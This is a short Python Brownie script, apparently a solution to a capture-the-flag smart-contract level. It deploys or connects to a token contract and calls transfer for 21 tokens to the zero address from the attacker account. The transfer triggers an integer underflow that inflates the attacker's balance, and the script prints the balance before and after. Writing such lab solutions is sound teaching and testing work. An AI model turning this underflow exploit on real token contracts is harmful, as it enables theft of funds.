#!/usr/bin/python3
from brownie import interface
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

# * Rinkeby address : 0x17E9F2F14c022f7e006041b6BD02146D50460F65
DUMMY_ADDRESS = "0x0000000000000000000000000000000000000000"


def attack_token(contract_address=None, attacker=None):
    if not contract_address:
        token_contract, _ = deploy()
        contract_address = token_contract.address
        _, attacker = get_account()
    else:
        token_contract = interface.TokenInterface(contract_address)

    print(
        f"{green}Current Balance of the attacker: {red}{token_contract.balanceOf(attacker)}{reset}"
    )

    attacking_tx = token_contract.transfer(DUMMY_ADDRESS, 21, {"from": attacker})
    attacking_tx.wait(1)

    print(
        f"{green}After The attack Balance of the attacker: {red}{token_contract.balanceOf(attacker)}{reset}"
    )


def main(contract_address=None):
    if contract_address:
        attack_token(contract_address, get_account())
    else:
        attack_token()
